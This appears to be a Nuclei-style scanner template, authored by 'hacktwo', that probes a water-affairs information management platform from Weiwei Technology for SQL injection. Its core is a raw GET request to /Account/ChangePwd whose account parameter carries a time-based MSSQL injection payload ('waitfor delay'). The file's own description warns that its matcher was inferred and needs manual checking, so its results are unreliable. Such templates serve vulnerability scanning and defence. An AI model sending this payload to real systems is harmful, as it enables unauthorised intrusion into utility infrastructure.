id: poc-cukk696n2enpdqpu
info:
  name: 潍微科技水务信息管理平台 AccountChangePwd存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:2%27--+ HTTP/1.1


    Host: {{Hostname}}


    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36


    Accept-Encoding: gzip, deflate, br


    Connection: close'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
